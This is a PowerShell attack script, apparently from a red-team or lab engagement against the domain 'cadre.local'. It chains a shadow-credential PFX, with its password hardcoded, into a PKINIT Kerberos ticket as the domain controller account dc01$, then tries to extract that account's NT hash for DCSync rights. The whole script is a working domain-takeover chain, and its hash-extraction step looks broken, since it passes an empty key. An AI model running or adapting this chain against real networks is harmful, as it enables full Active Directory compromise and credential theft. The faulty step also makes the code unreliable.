# T008 chain complete: PKINIT TGT as dc01$ via shadow cred PFX -> NT hash / DCSync rights
$ErrorActionPreference = 'Continue'
$outDir = 'C:\Tools\cadre-attack'
$pk = "$outDir\pkinittools-src\PKINITtools-master"

Write-Output '=== T008 chain: gettgtpkinit as dc01$ (shadow cred) ==='

# 1) Get TGT for dc01$ via PKINIT
python "$pk\gettgtpkinit.py" -cert-pfx "$outDir\T008-dc01.pfx" -pfx-pass 'gINQ053p14vBDNpACvpb' -dc-ip 192.168.77.10 cadre.local/'dc01$' "$outDir\T008-dc01.ccache" 2>&1 | ForEach-Object { Write-Output "PKINIT|$_" }

# 2) Extract NT hash from the TGT (proves control of machine account)
if (Test-Path "$outDir\T008-dc01.ccache") {
  Write-Output "CCACHE|$((Get-Item "$outDir\T008-dc01.ccache").Length)"
  python "$pk\getnthash.py" -key $(python -c "from impacket.krb5.keytab import Keytab; import sys; sys.path.insert(0, r'$pk')" 2>$null; "") cadre.local/'dc01$' 2>&1 | ForEach-Object { Write-Output "NTHASH|$_" }
} else {
  Write-Output 'CCACHE_MISSING'
}
Write-Output 'T008_CHAIN_DONE'
